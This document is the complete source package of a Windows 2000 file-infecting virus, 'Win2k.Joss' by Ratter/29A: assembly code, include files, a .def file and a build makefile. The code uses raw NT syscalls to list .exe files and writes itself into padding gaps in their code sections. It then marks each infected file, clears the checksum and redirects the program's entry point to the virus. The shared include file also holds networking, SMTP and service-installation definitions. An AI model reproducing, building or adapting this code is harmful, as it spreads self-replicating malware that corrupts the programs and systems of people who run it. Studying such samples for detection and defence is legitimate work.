
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[JOSS.ASM]ÄÄÄ
; Win2k.Joss by Ratter/29A

        .586p
	.model	flat, stdcall
	locals

	include	useful.inc
	include	win32api.inc
	include	mz.inc
	include	pe.inc
	include my_macroz.inc

	NtOpenFile		equ	64h
	NtQueryDirectoryFile	equ	7dh
	NtClose			equ	18h
	NtCreateSection		equ	2bh
	NtMapViewOfSection	equ	5dh
	NtUnmapViewOfSection	equ	0e7h
        
unicode_string	struc
        us_length	dw	?
		        dw	?
	us_pstring	dd	?
unicode_string	ends

path_name	struc
	pn_name		dw	MAX_PATH dup(?)
path_name	ends

object_attributes	struc
	oa_length	dd	?
	oa_rootdir	dd	?
	oa_objectname	dd	?
	oa_attribz	dd	?
	oa_secdesc	dd	?
	oa_secqos	dd	?
object_attributes	ends

pio_status_block	struc
	psb_ntstatus	dd	?
	psb_info	dd	?
pio_status_block	ends

@asciiz_to_unicode	macro
	xor ah, ah
	lodsb
	stosw
	test al, al
	jz $+4
        jmp $-7
	endm

@syscall	macro	fc, paramz
	mov eax, fc
	mov edx, esp
	int 2eh
	add esp, (paramz*4)
	endm

	.data
	db      ?

        .code

start_:
_joss_start_	equ	$
	pushad
	@SEH_SetupFrame <jmp joss_end>

	bt dword ptr [esp+8+cPushad], 31
	jc joss_end
        
start	proc	near
        local trailings:unicode_string
        local trailings_point_dir:path_name
        local object_attribz:object_attributes
        local dhandle:DWORD
        local io_status_block:pio_status_block
        local find_buffer:path_name

        local wfnd:WIN32_FIND_DATA

        mov dword ptr [trailings], 80008h
        lea eax, [trailings_point_dir]
        mov dword ptr [trailings.us_pstring], eax

        @pushsz "\??\"
        pop esi
        xchg eax, edi
	@asciiz_to_unicode

	xor ecx, ecx
        mov esi, 20290h
	movzx eax, word ptr [trailings]
	lea edi, [trailings_point_dir+eax]

	lodsw
	test ax, ax
	jz $+7
        inc ecx
	stosw
	jmp $-10

	shl ecx, 1
	add cx, word ptr [trailings]
	mov ax, cx
	shl ecx, 16
	mov cx, ax
	mov dword ptr [trailings], ecx

	xor eax, eax
	lea edi, [object_attribz]
	push edi
	push 18h/4
	pop ecx
	rep stosd
	pop edi

	push 18h
	pop dword ptr [edi]
	lea eax, [trailings]
	mov dword ptr [edi+8], eax
	push 40h
	pop dword ptr [edi+12]

	push 4021h
	push 03h
	lea eax, [io_status_block]
	push eax
	push edi
	push 100001h
        lea eax, [dhandle]
	push eax
	@syscall NtOpenFile, 6
	mov ebx, dword ptr [dhandle]

	xor ecx, ecx
main_loop:
	push ecx

        xor eax, eax
        push eax
        call $+13
        	dw	0ah
        	dw	0ah
        	dd	?
        pop esi
        call $+15
        	dw	'<', '.', 'e', 'x', 'e'
	pop edi
	mov dword ptr [esi+4], edi
	jecxz $+4
	xor esi, esi
	push esi
	push 1
	push 3
	push MAX_PATH*2
	lea edx, [find_buffer]
	push edx
	lea edx, [io_status_block]
	push edx
	push eax
	push eax
	push eax
	push ebx
        @syscall NtQueryDirectoryFile, 11
        pop ecx
        test eax, eax
        jnz main_loop_end

        push dword ptr [trailings]

        lea esi, [find_buffer]
 	lea edi, [trailings]
        call infect_file

        pop dword ptr [trailings]

        inc ecx
        jmp main_loop

main_loop_end:
	push ebx
	@syscall NtClose, 1

       	leave
joss_end:
	@SEH_RemoveFrame
	popad
	mov eax, offset end
host_start	equ	$-4
	jmp eax

	db	0, "[Win2k.Joss] by Ratter/29A", 0

infect_file	proc	near
        local trailings_point_dir:path_name
        local object_attribz:object_attributes
        local dhandle:DWORD
        local shandle:DWORD
        local io_status_block:pio_status_block
        local soffset:DWORD
        local bytes:DWORD
        local soffset_:QWORD

        pushad
	@SEH_SetupFrame <jmp infect_file_end>

	movzx eax, word ptr [edi]
	mov edx, dword ptr [edi+4]
	push edi
	lea edi, [edx+eax]

	mov ecx, dword ptr [esi+3ch]
	push ecx
	lea esi, [esi+5eh]
	rep movsb

        pop ecx
	pop edi

	add cx, word ptr [edi]
	mov ax, cx
	shl ecx, 16
	mov cx, ax
	mov dword ptr [edi], ecx
	xchg edi, esi

	xor eax, eax
	lea edi, [object_attribz]
	push edi
	push 18h/4
	pop ecx
	rep stosd
	pop edi

	push 18h
	pop dword ptr [edi]
	mov dword ptr [edi+8], esi
	push 40h
	pop dword ptr [edi+12]

        push 4060h
	push 03h
        lea eax, [io_status_block]
	push eax
	push edi
	push 100007h
        lea eax, [dhandle]
	push eax
	@syscall NtOpenFile, 6
	test eax, eax
	jnz infect_file_end

        xor eax, eax
        push dword ptr [dhandle]
        push 08000000h
        push PAGE_READWRITE
        push eax
        push eax
        push 0f0007h
        lea eax, [shandle]
        push eax
        @syscall NtCreateSection, 7
        test eax, eax
        jnz infect_file_end_close_file

        lea edi, [soffset]
        std
        mov ecx, 4
        xor eax, eax
        rep stosd
        cld

	xor eax, eax
        push 4
        push eax
        push 1
        lea edx, [bytes]
        push edx
        lea edx, [soffset_]
        push edx
        push eax
        push eax
        lea eax, [soffset]
        push eax
        push -1
        push dword ptr [shandle]
        @syscall NtMapViewOfSection, 10
	test eax, eax
	jnz infect_file_end_close_section
	mov ebx, dword ptr [soffset]

	;
	call check_for_valid_pe
	jc infect_file_end_unmap_view
	jnz infect_file_end_unmap_view

	cmp dword ptr [ebx.MZ_res], not "RAT"
	jz infect_file_end_unmap_view

	mov eax, dword ptr [ebx.MZ_lfanew]
	add eax, ebx
	movzx edi, word ptr [eax.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea edi, [edi+eax+IMAGE_SIZEOF_FILE_HEADER+4]
	mov esi, dword ptr [edi.SH_PointerToRawData]
	mov ecx, dword ptr [edi.SH_SizeOfRawData]
	add esi, ebx

	xor edx, edx
gap_loop:
	jecxz gap_loop_end
	lodsb
	dec ecx
	call is_gap
	jz $+6
	xor edx, edx
	jmp gap_loop

	inc edx
	cmp edx, _joss_end_-_joss_start_
	jnz gap_loop

gap_loop_end:
	cmp edx, _joss_end_-_joss_start_
	jnz infect_file_end_unmap_view

        sub esi, _joss_end_-_joss_start_
	push esi
        sub esi, dword ptr [edi.SH_PointerToRawData]
        pop edi
        sub esi, ebx

        push esi
        call $+5
joss_here:
        pop esi
        sub esi, joss_here-_joss_start_
        mov ecx, _joss_end_-_joss_start_
        rep movsb
        pop esi

	mov eax, dword ptr [ebx.MZ_lfanew]
	mov dword ptr [ebx.MZ_res], not "RAT"
	add eax, ebx
	and dword ptr [eax.NT_OptionalHeader.OH_CheckSum], 0

	mov ecx, dword ptr [eax.NT_OptionalHeader.OH_ImageBase]
	add ecx, dword ptr [eax.NT_OptionalHeader.OH_AddressOfEntryPoint]
        mov dword ptr [edi-(_joss_end_-host_start)], ecx

	mov edx, dword ptr [eax.NT_OptionalHeader.OH_BaseOfCode]
	add edx, esi
	mov dword ptr [eax.NT_OptionalHeader.OH_AddressOfEntryPoint], edx
	;

infect_file_end_unmap_view:
        push ebx
        push -1
        @syscall NtUnmapViewOfSection, 2
infect_file_end_close_section:
        push dword ptr [shandle]
        @syscall NtClose, 1
infect_file_end_close_file:
	push dword ptr [dhandle]
	@syscall NtClose, 1
infect_file_end:
	@SEH_RemoveFrame
	popad
	leave
	retn
infect_file	endp

check_for_valid_pe:
	pushad
	movzx eax, word ptr [ebx]
	not eax
	cmp eax, not "ZM"
	stc
	jnz check_for_valid_pe_end
	mov edx, dword ptr [ebx.MZ_lfanew]
	add edx, ebx
	movzx eax, word ptr [edx]
	not eax
	cmp eax, not "EP"
	stc
	jnz check_for_valid_pe_end
	cmp word ptr [edx.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
	stc
	jnz check_for_valid_pe_end
	movzx eax, word ptr [edx.NT_FileHeader.FH_Characteristics]
	not al
	test eax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_DLL
	clc
check_for_valid_pe_end:
	popad
	retn

is_gap:
	cmp al, 90h
	jz is_gap_end
	cmp al, 0cch
	jz is_gap_end
	test al, al
	jz is_gap_end
is_gap_end:
	retn

_joss_end_	equ	$

end:
	push 0
	calle ExitProcess

start	endp
end	start_
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[JOSS.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[JOSS.DEF]ÄÄÄ
NAME         PREDLOHA WINDOWAPI

DESCRIPTION  'Predloha'

CODE         PRELOAD MOVEABLE DISCARDABLE
DATA         PRELOAD MOVEABLE MULTIPLE

EXETYPE      WINDOWS

HEAPSIZE     131072
STACKSIZE    131072
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[JOSS.DEF]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[my_include.inc]ÄÄÄ
SERVICE_TABLE_ENTRY	struc
	STE_ServiceName	dd	?
	STE_ServiceProc	dd	?
SERVICE_TABLE_ENTRY	ends

SERVICE_STATUS		struc
	SS_ServiceType			dd	?
	SS_CurrentState			dd	?
	SS_ControlsAccepted		dd	?
	SS_Win32ExitCode		dd	?
	SS_ServiceSpecificExitCode	dd	?
	SS_CheckPoint			dd	?
	SS_WaitHint			dd	?
SERVICE_STATUS		ends

OVERLAPPED		struc
	O_Internal	dd	?
	O_InternalHigh	dd	?
	O_loffset	dd	?
	O_OffsetHigh	dd	?
	O_hEvent	dd	?
OVERLAPPED		ends

sockaddr_in	struc
	sin_family	dw	?
	sin_port	dw	?
	sin_addr	dd	?
	sin_zero	db	8 dup (?)
sockaddr_in	ends

hostent		struc
	h_name		dd	?
	h_alias		dd	?
	h_addr		dw	?
	h_len		dw	?
	h_list		dd	?
hostent		ends

timeval		struc
	tv_sec	dd	?
	tv_usec	dd	?
timeval		ends

fd_set		struc
	fd_count	dd	?
	fd_array	dd	?
fd_set		ends

RASCONNSTATUSA		struc
	RCS_dwSize		dd	?
	RCS_rasconnstate	dd	?
	RCS_dwError		dd	?
	RCS_szDeviceType	db 	16 + 1 dup(?)
	RCS_szDeviceName	db	128 + 1 dup(?)
RASCONNSTATUSA		ends

_email_		struc
	EM_MailFrom	dd	?	; pointer to ASCIIZ
	EM_RcptTo	dd	?	; pointer to ASCIIZ
	EM_Subject	dd	?	; pointer to ASCIIZ
	EM_Message	dd	?	; pointer to ASCIIZ
	EM_FilezNum	dd	?	; number of filez; if highest bit is set
					; then in EM_Filez is a *.msg file
	EM_Filez	dd	?	; pointer to ASCIIZ pointerz
_email_		ends

SYSTEMTIME	struc
	ST_Year		dw	?
	ST_Month	dw	?
	ST_DayOfWeek	dw	?
	ST_Day		dw	?
	ST_Hour		dw	?
	ST_Minute	dw	?
	ST_Second	dw	?
	ST_Milliseconds	dw	?
SYSTEMTIME	ends

oper		struc
	OP_Oper		dd	?
	OP_Rites	db	?	; 1 - RW; 0 - Ronly
oper		ends

@copy		macro	source
	local	copy_end
	local	copy_loop
	push esi
	mov esi, source
copy_loop:
	lodsb
	test al, al
	jz copy_end
	stosb
	jmp copy_loop
copy_end:
	pop esi
endm

@endsz_  	macro
        local   nxtchr
        push esi
        mov esi, edi
nxtchr:
	lodsb
	test al, al
	jnz nxtchr
	xchg esi, edi
	pop esi
endm

@pushvar	macro	variable, empty
	local   next_instr
	ifnb <empty>
	%out too much arguments in macro '@pushvar'
	.err
	endif
	call next_instr
	variable
next_instr:
endm

	CR_LF				equ	0a0dh
	WAIT_TIMEOUT			equ 	103h
	SMTP_PORT			equ	25

	SC_MANAGER_CONNECT		equ	1
	SC_MANAGER_CREATE_SERVICE	equ	2
	DELETE				equ	10000h
	SERVICE_AUTO_START		equ	2
	SERVICE_WIN32_OWN_PROCESS	equ	10h
	SERVICE_ACCEPT_SHUTDOWN		equ	4
	SERVICE_CONTROL_RUN		equ	0
	CK_SERVICE_CONTROL		equ	0
	CK_PIPE				equ	1
	NO_ERROR			equ	0
	
	SERVICE_CONTROL_INTERROGATE	equ	4
	SERVICE_CONTROL_SHUTDOWN	equ	5

	SERVICE_STOPPED			equ	1
	SERVICE_START_PENDING		equ	2
	SERVICE_STOP_PENDING		equ	3
	SERVICE_RUNNING			equ	4
	SERVICE_CONTINUE_PENDING	equ	5
	SERVICE_PAUSE_PENDING		equ	6
	SERVICE_PAUSED			equ	7

	PIPE_ACCESS_OUTBOUND		equ	2
	PIPE_TYPE_BYTE			equ	0
	FILE_FLAG_OVERLAPPED		equ	40000000h
	
	INFINITE			equ	-1
	
	AF_INET			equ	2
	HEAP_ZERO_MEMORY	equ	8
	SOCK_STREAM		equ	1
	CR_LF			equ	0a0dh
	MAX_ALLOWED_OPERZ	equ	5
	SYNCHRONIZE		equ	100000h

	RASCS_CONNECTED		equ	2000h
	MOVEFILE_DELAY_UNTIL_REBOOT	equ	4
	HKEY_LOCAL_MACHINE	equ	80000002h
	KEY_ENUMERATE_SUB_KEYS	equ	8h
	HKEY_USERS		equ	80000003h
	KEY_QUERY_VALUE		equ	1
	KEY_SET_VALUE		equ	2
	REG_SZ			equ	1
	REG_DWORD		equ	4
	ERROR_NO_MORE_ITEMS	equ	259
	
	INET_THREADZ_COUNT	equ	2
	INTERNET_OPEN_TYPE_DIRECT	equ	1

	POP3_PORT		equ	110
	OK			equ	" KO+"
	ERROR			equ	"RRE-"
	
	SOXZ_PORT		equ	1080

STARTUPINFO	STRUCT				;used by CreateProcessA API
	cb		DWORD	?
	lpReserved	DWORD	?
	lpDesktop	DWORD	?
	lpTitle		DWORD	?
	dwX		DWORD	?
	dwY		DWORD	?
	dwXSize		DWORD	?
	dwYSize		DWORD	?
	dwXCountChars	DWORD	?
	dwYCountChars	DWORD	?
	dwFillAttribute	DWORD	?
	dwFlags		DWORD	?
	wShowWindow	WORD	?
	cbReserved2	WORD	?
	lpReserved2	DWORD	?
	hStdInput	DWORD	?
	hStdOutput	DWORD	?
	hStdError	DWORD	?
STARTUPINFO	ENDS
PROCESS_INFORMATION	STRUCT
	hProcess	DWORD	?
	hThread		DWORD	?
	dwProcessId	DWORD	?
	dwThreadId	DWORD	?
PROCESS_INFORMATION	ENDS

	GMEM_ZEROINIT		equ	040h
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[my_include.inc]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[my_macroz.inc]ÄÄÄ
@pushvar	macro	variable, empty
	local   next_instr
	ifnb <empty>
	%out too much arguments in macro '@pushvar'
	.err
	endif
	call next_instr
	variable
next_instr:
endm

@messagebox	macro	message, empty
	ifnb <empty>
	%out too much arguments in macro '@pushvar'
	.err
	endif
	push 0
	@pushsz "Debug"
	@pushsz <message>
	push 0
	call MessageBoxA
endm

calle	macro	api
	extrn	api:PROC
	call	api
endm

@gimme_delta	macro
	local	gimme_delta
        call gimme_delta
gimme_delta:
	mov esi, esp
        lodsd
        sub eax, offset gimme_delta
	xchg eax, ebp
        mov esp, esi
endm

calla	macro	api
	call	dword ptr [ebp+api]
endm
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[my_macroz.inc]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKEFILE]ÄÄÄ
#       make                    Will build pemangle.exe
#       make -B -DDEBUG         Will build the debug version of pemangle.exe

NAME = joss
OBJS = $(NAME).obj
DEF  = $(NAME).def

!if $d(DEBUG)
TASMDEBUG=/zi /m
LINKDEBUG=/v
!else
TASMDEBUG=/m
LINKDEBUG=
!endif

!if $d(MAKEDIR)
IMPORT=import32.lib          # Edit this to point your own library path
!else
IMPORT=import32.lib                # or put the file in the same directory
!endif

$(NAME).EXE: $(OBJS) $(DEF)
  tlink32 /Tpe /aa /c /x $(LINKDEBUG) $(OBJS),$(NAME),, $(IMPORT), $(DEF)
  pewrite.exe $(NAME).exe
  del $(OBJS)

.asm.obj:
   tasm32 $(TASMDEBUG) /ml /i..\..\includes $&.asm
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKEFILE]ÄÄÄ
